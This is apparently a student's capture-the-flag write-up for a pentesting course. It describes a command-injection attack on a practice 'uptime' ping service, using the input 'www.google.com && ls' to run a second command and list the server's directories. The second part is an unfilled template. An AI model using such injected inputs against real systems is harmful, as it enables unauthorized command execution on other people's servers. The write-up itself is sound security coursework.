Writeup 3 - Pentesting I
======

Name: Noah Bathras
Section: 0101

I pledge on my honor that I havie not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement of honor pledge: Noah Bathras

## Assignment 4 Writeup

### Part 1 (45 pts)
The flag I found was: CMSC389R-{p1ng_as_a_$erv1c3}
The way I obtained the flag was through command line injection, which is an attack in which the goal is execution of arbitrary commands on teh host operating system via a vulnerable application.  In this case the vulnerable application was Cornerstone Airlines uptime system.
Before I could start the attack I ran the command:

`nc cornerstoneairlines.co 45` 

Which connected me to the uptime application.

I was then able to run the command:

`www.google.com && ls` 

This command assumes that uptime is just taking whatever is enetered into the prompt and adding that to the end of a ping command.  Because this was the case, you can use the && command to string multiple commands together.  In this case I ran both the ping command and the ls command which returned:

`PING wwww.google.com (216.58.204.100) 56 (84) bytes of data. 64 bytes from par10s28-in-f100.net (2167.48.204.100): ucmp_seq=1 ttl=53 time= 77.4 ms 64 bytes from par10s28-in-f100.1e100.net (216.58.204.100): icmp_seq=2 ttl=53 time=77.0 ms --- www.google.com ping statistic --- 2 packets transmitted, 2 received, 0% packet losss, time 1000 ms rtt min/avg/max/mdev = 77.066/77.273/77.480/0.207 ms bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var` 

Which once you strip out the output from the ping command, represents the contents of the home directory of the server:

`bin boot dev etc  homelib lib64 media mnt opt proc root run sbin srv sys tmp usr var` 


### Part 2 (55 pts)
*Put your writeup >= 200 words here in response to part 2 prompt. Your code for part 2 should be copied into a file in the /writeup directory and pushed there as well*
